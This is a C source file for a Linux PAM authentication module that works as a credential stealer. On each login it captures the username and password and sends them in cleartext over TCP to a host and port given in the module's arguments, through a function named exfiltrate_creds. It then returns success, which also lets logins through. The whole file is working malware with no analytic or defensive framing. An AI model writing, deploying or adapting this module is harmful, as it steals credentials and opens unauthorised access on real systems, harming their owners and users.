#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define TARGET_TAG_STRING "target=" 
#define PORT_TAG_STRING "port="
#define NEW_LINE "\n"
#define UNKNOW_PASSWORD_STRING "\b\n\r"

typedef struct {
   char  target[256];
   long   port;
} Args_t;


Args_t* parse_args(int argc, const char **argv)
{
	Args_t *args = NULL;
	int i;

	/* Allocating args with 0s */
	args = calloc( 1, sizeof( *args ) );
	if ( NULL == args ){
		return NULL;
	}

	/* Parsing parameters */
	for( i = 0 ; i < argc ; i++ ) {
		if( strncmp( argv[i], TARGET_TAG_STRING, sizeof(TARGET_TAG_STRING) - 1) == 0 ) {
			strncpy( args->target, argv[i] + ( sizeof(TARGET_TAG_STRING) - 1 ), sizeof(args->target) - 1 );
		} else if( strncmp(argv[i], PORT_TAG_STRING, sizeof(PORT_TAG_STRING) -1 ) == 0 ) {
			//args->port = strtol(argv[i], argv[i] , 10);
			args->port = atoi(argv[i] + ( sizeof(PORT_TAG_STRING) - 1 ) );
		}
	}

	/* If any empty parameter return NULL */
	if ('\0' == args->target[0] || '\0' == args->port ){
		return NULL;
	}


	return args;
}

void exfiltrate_creds(Args_t* args,const char *username,const char *password)
{
	int sock;
	struct sockaddr_in server;
	
	//Create socket
	sock = socket(AF_INET , SOCK_STREAM , 0);

	if (sock == -1){
		return;
	}
	
	server.sin_addr.s_addr = inet_addr( args->target );
	server.sin_family = AF_INET;
	server.sin_port = htons( args->port );

	if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0){
		return;
	}
	
	
	//Send data
	send(sock , (const void *) username , strlen(username) , 0);
	send(sock , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
	send(sock , (const void *) password , strlen(password) , 0);
	send(sock , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
	send(sock , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);

	close(sock);
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, const char **argv)
{
	int pam_code;
	const char *username = NULL;
	const char *password = NULL;
	Args_t* args;


	/* Getting the username */
	pam_code = pam_get_user(handle, &username, "USERNAME: ");
	if (pam_code != PAM_SUCCESS) {
		fprintf(stderr, "Can't get username");
		return PAM_AUTH_ERR;
	}

	password = NULL;

	/* Getting the password */
	pam_code = pam_get_authtok(handle, PAM_AUTHTOK, &password, "Password: ");
	if (pam_code != PAM_SUCCESS) {
		fprintf(stderr, "Can't get password");
		return PAM_AUTH_ERR;
	}

	// If PAM cannot get password from unknown user, password will be replaced with "\b\n\r\177INCORRECT"
	if ( 0 == strncmp(password, UNKNOW_PASSWORD_STRING, sizeof(UNKNOW_PASSWORD_STRING) - 1 ) ){
		return PAM_AUTH_ERR;
	}

	if ( NULL == (args = parse_args(argc, argv)) ){
		return PAM_AUTH_ERR;
	}

	exfiltrate_creds(args, username, password);

	printf("");

	memset(args, 0, sizeof(*args));
	free(args);
	return PAM_SUCCESS;
}
